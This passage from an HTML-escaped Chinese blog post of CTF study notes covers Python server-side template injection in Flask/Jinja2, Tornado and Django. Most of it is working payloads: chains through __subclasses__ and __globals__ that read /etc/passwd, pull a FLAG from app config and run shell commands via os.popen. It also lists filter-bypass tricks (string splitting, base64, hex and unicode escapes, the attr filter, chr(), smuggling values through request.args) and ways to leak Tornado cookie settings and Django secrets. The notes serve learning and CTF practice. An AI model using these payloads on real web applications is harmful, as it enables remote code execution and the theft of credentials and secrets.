&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="各种各样的bypass">各种各样的bypass&lt;/h2>
&lt;p>一般都不会只过滤一种的，综合应用&lt;/p>
&lt;h3 id="针对关键字的过滤">针对关键字的过滤&lt;/h3>
&lt;p>以class为例，做一个字符串的拼接&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤">过滤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-1">过滤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>点号用在向下不停地取值，跟&lt;code>[]&lt;/code>很像&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> 很强的一个flask内置filter，&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-2">过滤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> 先找出&lt;code>chr()&lt;/code>的位置（注意跑脚本跑的是&lt;code>__builtins__&lt;/code> 这个函数是内建的），用模板语句给它赋个值，然后调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤_">过滤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>按字符串的方式走，也可&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-3">过滤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-">过滤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>替代&lt;/li>
&lt;/ul>
&lt;h2 id="其它姿势">其它姿势&lt;/h2>
&lt;h3 id="短短短">短短短&lt;/h3>
&lt;p>利用的是Flask中的&lt;code>config&lt;/code>对象，它可以存储一部分设置项的内容；&lt;code>config.update&lt;/code>方法可以用来存储设置项中的变量，用法是&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>这里用一个题做例子，指路-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---劫持got表getshell">***pwn - 劫持got表getshell&lt;/h3>
&lt;p>pwn，在学了在学了，指新建文件夹和md文档😅&lt;/p>
&lt;p>参考：&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python 沙箱逃逸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce&lt;/p>
&lt;h2 id="内置字典对象">内置字典对象&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> 指向的是RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{handler.settings}}
{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章-&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息&lt;/p>
&lt;hr>
&lt;p>两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了&lt;/p>
&lt;p>这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼&lt;/p></description></item></channel></rss>